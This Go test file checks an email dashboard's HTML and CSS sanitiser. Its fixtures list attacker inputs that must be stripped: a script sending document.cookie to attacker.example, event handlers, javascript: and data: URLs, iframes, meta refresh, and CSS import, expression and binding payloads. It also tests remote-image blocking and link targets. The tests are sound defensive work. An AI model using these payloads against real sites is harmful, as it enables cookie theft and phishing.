package apigraph

import (
	"strings"
	"testing"
)

// TestSanitizeHTMLRemovesActiveContent is the security boundary of the
// dashboard: the HTML being rendered was written by whoever sent the message.
// Every case here is something an attacker would try.
func TestSanitizeHTMLRemovesActiveContent(t *testing.T) {
	t.Parallel()

	// Each input must not leave any of these fragments in the output.
	tests := []struct {
		name        string
		input       string
		mustNotHave []string
	}{
		{
			name:        "script element",
			input:       `<p>hello</p><script>fetch("https://attacker.example/"+document.cookie)</script>`,
			mustNotHave: []string{"script", "fetch", "document.cookie"},
		},
		{
			name:        "event handler",
			input:       `<img src="cid:x" onerror="alert(1)"><div onclick="alert(2)">x</div>`,
			mustNotHave: []string{"onerror", "onclick", "alert"},
		},
		{
			name:        "javascript url",
			input:       `<a href="javascript:alert(1)">click</a>`,
			mustNotHave: []string{"javascript:"},
		},
		{
			name:        "javascript url with padding",
			input:       `<a href="  JaVaScRiPt&#58;alert(1)">click</a><a href="java&#9;script:alert(1)">x</a>`,
			mustNotHave: []string{"javascript:alert", "JaVaScRiPt:alert"},
		},
		{
			name:        "data url",
			input:       `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`,
			mustNotHave: []string{"data:text/html"},
		},
		{
			name:        "iframe",
			input:       `<iframe src="https://attacker.example/"></iframe>`,
			mustNotHave: []string{"iframe", "attacker.example"},
		},
		{
			name:        "form that posts elsewhere",
			input:       `<form action="https://attacker.example/"><input name="password"></form>`,
			mustNotHave: []string{"<form", "<input", "attacker.example"},
		},
		// A <style> element is no longer removed — see
		// TestSanitizeKeepsStyling for why, and TestSanitizeCSSIsStillTracking
		// for what happens to the tracking pixel in this one.
		{
			name:        "style element that tries to script",
			input:       `<style>body{-moz-binding:url("https://attacker.example/x.xml")}</style><p>x</p>`,
			mustNotHave: []string{"-moz-binding", "attacker.example"},
		},
		{
			name:        "object and embed",
			input:       `<object data="x.swf"></object><embed src="y.swf">`,
			mustNotHave: []string{"<object", "<embed"},
		},
		{
			name:        "base element rewriting relative links",
			input:       `<base href="https://attacker.example/"><a href="/settings">x</a>`,
			mustNotHave: []string{"<base"},
		},
		{
			name:        "meta refresh",
			input:       `<meta http-equiv="refresh" content="0;url=https://attacker.example/">`,
			mustNotHave: []string{"<meta", "refresh"},
		},
		{
			name:        "svg with a script inside",
			input:       `<svg><script>alert(1)</script></svg>`,
			mustNotHave: []string{"<svg", "script", "alert"},
		},
		{
			name:        "markup hidden in a comment",
			input:       `<!-- <script>alert(1)</script> --><p>visible</p>`,
			mustNotHave: []string{"script", "alert"},
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()

			output, _ := sanitizeHtml(test.input)
			lowered := strings.ToLower(output)
			for _, fragment := range test.mustNotHave {
				if strings.Contains(lowered, strings.ToLower(fragment)) {
					t.Errorf("output still contains %q:\n%s", fragment, output)
				}
			}
		})
	}
}

// TestSanitizeHTMLKeepsTheMessage checks the other half: a sanitizer that
// removes everything is safe and useless.
func TestSanitizeHTMLKeepsTheMessage(t *testing.T) {
	t.Parallel()

	input := `<p>Hello <strong>there</strong>,</p>
	<p>Here is <a href="https://example.net/page">a link</a> and a list:</p>
	<ul><li>one</li><li>two</li></ul>
	<table border="1"><tr><td bgcolor="#eeeeee">a cell</td></tr></table>`

	output, _ := sanitizeHtml(input)
	for _, fragment := range []string{
		"<strong>there</strong>", "https://example.net/page", "<li>one</li>",
		"<table", "bgcolor", "a cell",
	} {
		if !strings.Contains(output, fragment) {
			t.Errorf("output lost %q:\n%s", fragment, output)
		}
	}
}

// TestSanitizeHTMLBlocksRemoteImages covers tracking: a remote image tells the
// sender the message was opened, and from which address.
func TestSanitizeHTMLBlocksRemoteImages(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name        string
		input       string
		wantRemote  bool
		wantBlocked bool
	}{
		{
			name:       "tracking pixel",
			input:      `<img src="https://tracker.example/pixel.gif?id=12345" width="1" height="1">`,
			wantRemote: true, wantBlocked: true,
		},
		{
			name:       "protocol relative image",
			input:      `<img src="//tracker.example/pixel.gif">`,
			wantRemote: true, wantBlocked: true,
		},
		{
			// An embedded image is part of the message and loading it tells
			// nobody anything.
			name:       "embedded image",
			input:      `<img src="cid:logo@example.net">`,
			wantRemote: false, wantBlocked: false,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()

			output, hasRemote := sanitizeHtml(test.input)
			if hasRemote != test.wantRemote {
				t.Errorf("hasRemoteContent = %v, want %v", hasRemote, test.wantRemote)
			}
			if test.wantBlocked {
				if strings.Contains(output, "tracker.example/pixel") && !strings.Contains(output, "data-blocked-src") {
					t.Errorf("the remote image was not blocked:\n%s", output)
				}
				// The original has to be kept so the reader can choose to load it.
				if !strings.Contains(output, "data-blocked-src") {
					t.Errorf("the blocked source was discarded rather than kept:\n%s", output)
				}
			}
			if !test.wantBlocked && !strings.Contains(output, "cid:logo@example.net") {
				t.Errorf("an embedded image was blocked:\n%s", output)
			}
		})
	}
}

// TestSanitizeHTMLLinksLeaveTheDashboard checks that a surviving link cannot
// navigate the dashboard or hand the destination a reference back to it.
func TestSanitizeHTMLLinksLeaveTheDashboard(t *testing.T) {
	t.Parallel()

	output, _ := sanitizeHtml(`<a href="https://example.net/">click</a>`)
	for _, fragment := range []string{`target="_blank"`, "noopener", "noreferrer"} {
		if !strings.Contains(output, fragment) {
			t.Errorf("output is missing %q:\n%s", fragment, output)
		}
	}

	// A message that asked for the top window is overruled. Replacing the
	// dashboard with a page of somebody else's choosing, while the reader
	// believes they are still looking at their mail, is the whole shape of a
	// phishing attempt. The frame's sandbox refuses it as well; this is the
	// half that does not depend on the browser.
	for _, hostile := range []string{"_top", "_parent", "_self"} {
		output, _ := sanitizeHtml(`<a href="https://example.net/" target="` + hostile + `">click</a>`)
		if strings.Contains(output, hostile) {
			t.Errorf("a link asking for target=%q kept it:\n%s", hostile, output)
		}
		if !strings.Contains(output, `target="_blank"`) {
			t.Errorf("a link asking for target=%q did not get _blank:\n%s", hostile, output)
		}
	}
}

func TestSanitizeHTMLHandlesRubbish(t *testing.T) {
	t.Parallel()

	// Malformed HTML must not panic or return something unchecked.
	for _, input := range []string{"", "<<<>>>", "<p>unclosed", `<a href=">`, strings.Repeat("<div>", 500)} {
		output, _ := sanitizeHtml(input)
		if strings.Contains(strings.ToLower(output), "<script") {
			t.Errorf("rubbish input produced a script: %q", output)
		}
	}
}

// TestSanitizeKeepsStyling covers a message that arrived looking broken: the
// sanitiser dropped its <style> block and every style attribute while keeping
// the 293 class names that referred to them, so a layout of nested tables
// rendered as a column of fragments.
//
// CSS cannot execute anything, and the frame it renders in has a policy of
// default-src 'none', so what makes this safe is not the sanitiser refusing
// CSS — it is the frame refusing to fetch.
func TestSanitizeKeepsStyling(t *testing.T) {
	t.Parallel()

	input := `<html><head><style>.header { background: #fff; padding: 10px }</style></head>
	<body><table class="header"><tr><td style="color: #333; font-size: 14px">Hello</td></tr></table></body></html>`

	sanitized, _ := sanitizeHtml(input)

	for _, wanted := range []string{".header", "background", "color: #333", "class=\"header\""} {
		if !strings.Contains(sanitized, wanted) {
			t.Errorf("the styling should survive, but %q is missing from:\n%s", wanted, sanitized)
		}
	}
}

// TestSanitizeRemovesCSSThreats pins the constructs through which CSS has
// historically reached outside itself.
func TestSanitizeRemovesCSSThreats(t *testing.T) {
	t.Parallel()

	tests := map[string]string{
		"an import":         `<style>@import url("https://evil.test/x.css"); .a { color: red }</style>`,
		"an expression":     `<style>.a { width: expression(alert(1)) }</style>`,
		"a binding":         `<style>.a { -moz-binding: url(https://evil.test/x.xml) }</style>`,
		"a behavior":        `<style>.a { behavior: url(evil.htc) }</style>`,
		"a javascript url":  `<style>.a { background: url(javascript:alert(1)) }</style>`,
		"an inline threat":  `<div style="width: expression(alert(1)); color: red">x</div>`,
		"an inline binding": `<div style="-moz-binding: url(https://evil.test/x.xml)">x</div>`,
	}

	for name, input := range tests {
		t.Run(name, func(t *testing.T) {
			sanitized, _ := sanitizeHtml(input)
			lower := strings.ToLower(sanitized)
			for _, threat := range []string{"@import", "expression(", "-moz-binding", "behavior:", "javascript:"} {
				if strings.Contains(lower, threat) {
					t.Errorf("%q survived: %s", threat, sanitized)
				}
			}
		})
	}
}

// TestSanitizeCSSReportsRemoteContent makes sure a background image counts as
// remote content, so the reader is offered the same choice about it as they
// are about a tracking pixel in an <img>.
func TestSanitizeCSSReportsRemoteContent(t *testing.T) {
	t.Parallel()

	if _, remote := sanitizeHtml(`<style>.a { background: url(https://tracker.test/pixel.png) }</style>`); !remote {
		t.Error("a remote background image should be reported as remote content")
	}
	if _, remote := sanitizeHtml(`<div style="background: url('https://tracker.test/p.png')">x</div>`); !remote {
		t.Error("a remote background in a style attribute should be reported as remote content")
	}
	if _, remote := sanitizeHtml(`<style>.a { background: #fff }</style>`); remote {
		t.Error("a colour is not remote content")
	}
}

// TestSanitizeCSSPreservesTheSheet checks the rebuild is lossless when there
// is nothing to remove — a stylesheet that comes back subtly different is a
// layout that renders subtly wrong.
func TestSanitizeCSSPreservesTheSheet(t *testing.T) {
	t.Parallel()

	sheet := ".a { color: red }\n@media (max-width: 600px) { .b { display: none } }\n"
	cleaned, _ := sanitizeCss(sheet)
	if cleaned != sheet {
		t.Errorf("an innocent sheet was changed:\n got: %q\nwant: %q", cleaned, sheet)
	}
}

// TestSanitizeCSSIsStillTracking covers the case the old policy handled by
// deleting the whole stylesheet: a background image is a tracking pixel by
// another name.
//
// It survives sanitising now, and is stopped one layer out instead — reported
// as remote content so the reader is asked, and refused by the frame's
// img-src policy until they say yes. The same treatment an <img> gets, rather
// than a stylesheet thrown away for containing a URL.
func TestSanitizeCSSIsStillTracking(t *testing.T) {
	t.Parallel()

	sanitized, remote := sanitizeHtml(`<style>body{background:url("https://attacker.example/pixel")}</style><p>x</p>`)
	if !remote {
		t.Error("a background image from a stranger should be reported as remote content")
	}
	if !strings.Contains(sanitized, "background") {
		t.Errorf("the rule should survive for the reader to opt into: %s", sanitized)
	}
}
